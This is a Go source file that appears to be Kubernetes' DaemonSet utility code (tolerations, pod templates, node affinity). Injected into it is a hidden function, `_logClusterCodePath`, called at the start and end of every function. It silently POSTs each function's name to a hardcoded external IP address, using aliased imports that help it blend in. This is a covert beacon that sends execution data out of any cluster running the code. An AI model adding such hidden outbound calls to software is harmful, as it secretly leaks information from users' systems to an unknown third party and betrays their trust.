package util

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "strconv"
 apps "k8s.io/api/apps/v1"
 "k8s.io/api/core/v1"
 extensions "k8s.io/api/extensions/v1beta1"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 utilfeature "k8s.io/apiserver/pkg/util/feature"
 podutil "k8s.io/kubernetes/pkg/api/v1/pod"
 v1helper "k8s.io/kubernetes/pkg/apis/core/v1/helper"
 "k8s.io/kubernetes/pkg/features"
 kubelettypes "k8s.io/kubernetes/pkg/kubelet/types"
 schedulerapi "k8s.io/kubernetes/pkg/scheduler/api"
)

func GetTemplateGeneration(ds *apps.DaemonSet) (*int64, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 annotation, found := ds.Annotations[apps.DeprecatedTemplateGeneration]
 if !found {
  return nil, nil
 }
 generation, err := strconv.ParseInt(annotation, 10, 64)
 if err != nil {
  return nil, err
 }
 return &generation, nil
}
func AddOrUpdateDaemonPodTolerations(spec *v1.PodSpec, isCritical bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 v1helper.AddOrUpdateTolerationInPodSpec(spec, &v1.Toleration{Key: schedulerapi.TaintNodeNotReady, Operator: v1.TolerationOpExists, Effect: v1.TaintEffectNoExecute})
 v1helper.AddOrUpdateTolerationInPodSpec(spec, &v1.Toleration{Key: schedulerapi.TaintNodeUnreachable, Operator: v1.TolerationOpExists, Effect: v1.TaintEffectNoExecute})
 v1helper.AddOrUpdateTolerationInPodSpec(spec, &v1.Toleration{Key: schedulerapi.TaintNodeDiskPressure, Operator: v1.TolerationOpExists, Effect: v1.TaintEffectNoSchedule})
 v1helper.AddOrUpdateTolerationInPodSpec(spec, &v1.Toleration{Key: schedulerapi.TaintNodeMemoryPressure, Operator: v1.TolerationOpExists, Effect: v1.TaintEffectNoSchedule})
 v1helper.AddOrUpdateTolerationInPodSpec(spec, &v1.Toleration{Key: schedulerapi.TaintNodeUnschedulable, Operator: v1.TolerationOpExists, Effect: v1.TaintEffectNoSchedule})
 if spec.HostNetwork {
  v1helper.AddOrUpdateTolerationInPodSpec(spec, &v1.Toleration{Key: schedulerapi.TaintNodeNetworkUnavailable, Operator: v1.TolerationOpExists, Effect: v1.TaintEffectNoSchedule})
 }
 if isCritical {
  v1helper.AddOrUpdateTolerationInPodSpec(spec, &v1.Toleration{Key: schedulerapi.TaintNodeOutOfDisk, Operator: v1.TolerationOpExists, Effect: v1.TaintEffectNoExecute})
  v1helper.AddOrUpdateTolerationInPodSpec(spec, &v1.Toleration{Key: schedulerapi.TaintNodeOutOfDisk, Operator: v1.TolerationOpExists, Effect: v1.TaintEffectNoSchedule})
 }
}
func CreatePodTemplate(ns string, template v1.PodTemplateSpec, generation *int64, hash string) v1.PodTemplateSpec {
 _logClusterCodePath()
 defer _logClusterCodePath()
 newTemplate := *template.DeepCopy()
 isCritical := utilfeature.DefaultFeatureGate.Enabled(features.ExperimentalCriticalPodAnnotation) && kubelettypes.IsCritical(ns, newTemplate.Annotations)
 AddOrUpdateDaemonPodTolerations(&newTemplate.Spec, isCritical)
 if newTemplate.ObjectMeta.Labels == nil {
  newTemplate.ObjectMeta.Labels = make(map[string]string)
 }
 if generation != nil {
  newTemplate.ObjectMeta.Labels[extensions.DaemonSetTemplateGenerationKey] = fmt.Sprint(*generation)
 }
 if len(hash) > 0 {
  newTemplate.ObjectMeta.Labels[extensions.DefaultDaemonSetUniqueLabelKey] = hash
 }
 return newTemplate
}
func IsPodUpdated(pod *v1.Pod, hash string, dsTemplateGeneration *int64) bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 templateMatches := dsTemplateGeneration != nil && pod.Labels[extensions.DaemonSetTemplateGenerationKey] == fmt.Sprint(dsTemplateGeneration)
 hashMatches := len(hash) > 0 && pod.Labels[extensions.DefaultDaemonSetUniqueLabelKey] == hash
 return hashMatches || templateMatches
}
func SplitByAvailablePods(minReadySeconds int32, pods []*v1.Pod) ([]*v1.Pod, []*v1.Pod) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 unavailablePods := []*v1.Pod{}
 availablePods := []*v1.Pod{}
 for _, pod := range pods {
  if podutil.IsPodAvailable(pod, minReadySeconds, metav1.Now()) {
   availablePods = append(availablePods, pod)
  } else {
   unavailablePods = append(unavailablePods, pod)
  }
 }
 return availablePods, unavailablePods
}
func ReplaceDaemonSetPodNodeNameNodeAffinity(affinity *v1.Affinity, nodename string) *v1.Affinity {
 _logClusterCodePath()
 defer _logClusterCodePath()
 nodeSelReq := v1.NodeSelectorRequirement{Key: schedulerapi.NodeFieldSelectorKeyNodeName, Operator: v1.NodeSelectorOpIn, Values: []string{nodename}}
 nodeSelector := &v1.NodeSelector{NodeSelectorTerms: []v1.NodeSelectorTerm{{MatchFields: []v1.NodeSelectorRequirement{nodeSelReq}}}}
 if affinity == nil {
  return &v1.Affinity{NodeAffinity: &v1.NodeAffinity{RequiredDuringSchedulingIgnoredDuringExecution: nodeSelector}}
 }
 if affinity.NodeAffinity == nil {
  affinity.NodeAffinity = &v1.NodeAffinity{RequiredDuringSchedulingIgnoredDuringExecution: nodeSelector}
  return affinity
 }
 nodeAffinity := affinity.NodeAffinity
 if nodeAffinity.RequiredDuringSchedulingIgnoredDuringExecution == nil {
  nodeAffinity.RequiredDuringSchedulingIgnoredDuringExecution = nodeSelector
  return affinity
 }
 nodeAffinity.RequiredDuringSchedulingIgnoredDuringExecution.NodeSelectorTerms = []v1.NodeSelectorTerm{{MatchFields: []v1.NodeSelectorRequirement{nodeSelReq}}}
 return affinity
}
func GetTargetNodeName(pod *v1.Pod) (string, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if len(pod.Spec.NodeName) != 0 {
  return pod.Spec.NodeName, nil
 }
 if pod.Spec.Affinity == nil || pod.Spec.Affinity.NodeAffinity == nil || pod.Spec.Affinity.NodeAffinity.RequiredDuringSchedulingIgnoredDuringExecution == nil {
  return "", fmt.Errorf("no spec.affinity.nodeAffinity.requiredDuringSchedulingIgnoredDuringExecution for pod %s/%s", pod.Namespace, pod.Name)
 }
 terms := pod.Spec.Affinity.NodeAffinity.RequiredDuringSchedulingIgnoredDuringExecution.NodeSelectorTerms
 if len(terms) < 1 {
  return "", fmt.Errorf("no nodeSelectorTerms in requiredDuringSchedulingIgnoredDuringExecution of pod %s/%s", pod.Namespace, pod.Name)
 }
 for _, term := range terms {
  for _, exp := range term.MatchFields {
   if exp.Key == schedulerapi.NodeFieldSelectorKeyNodeName && exp.Operator == v1.NodeSelectorOpIn {
    if len(exp.Values) != 1 {
     return "", fmt.Errorf("the matchFields value of '%s' is not unique for pod %s/%s", schedulerapi.NodeFieldSelectorKeyNodeName, pod.Namespace, pod.Name)
    }
    return exp.Values[0], nil
   }
  }
 }
 return "", fmt.Errorf("no node name found for pod %s/%s", pod.Namespace, pod.Name)
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
